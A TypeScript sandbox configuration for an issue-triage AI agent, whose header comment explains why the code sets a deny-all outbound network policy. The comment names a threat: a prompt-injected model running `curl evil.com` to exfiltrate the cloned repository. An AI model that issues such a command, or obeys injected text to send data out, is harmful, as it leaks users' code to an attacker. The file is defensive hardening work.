/**
 * Sandbox override for the issue-triage agent.
 *
 * Folder layout (agent/sandbox/sandbox.ts + agent/sandbox/workspace/**)
 * is used so the sandbox definition lives next to any future seeded
 * workspace files. If a top-level agent/sandbox.ts is added later, that
 * shorthand wins per eve's discovery rules.
 *
 * The default sandbox (no override) on Vercel is Vercel Sandbox via
 * `defaultBackend()`. The agent IS allowed to run in the sandbox by
 * default — see channels/github.ts's turn.started override, which used
 * to suppress the checkout. As of v2 P4 we re-enabled the checkout so
 * the model can `bash` / `read_file` / `glob` / `grep` against the
 * cloned repo.
 *
 * Vercel Sandbox's DEFAULT network policy is `allow-all` (see
 * https://vercel.com/docs/vercel-sandbox/concepts/firewall). That's
 * unsafe for an agent that runs bash against a cloned repo — a
 * prompt-injected model could `curl evil.com` and exfiltrate the
 * clone. This override sets `deny-all` on every session so the
 * sandbox has no outbound network at all.
 *
 * Important: the LLM call to MiniMax happens in the function runtime
 * (NOT the sandbox), so deny-all does NOT block the model. It only
 * blocks the sandboxed tools (`bash`, `read_file`, etc.).
 *
 * If a future tool needs outbound network from the sandbox (e.g.
 * `fetch_latest_docs`), narrow to `allow-domains` with a specific
 * allowlist rather than removing the policy entirely.
 */
import { defineSandbox } from "eve/sandbox";

export default defineSandbox({
  async onSession({ use }) {
    await use({ networkPolicy: "deny-all" });
  },
});
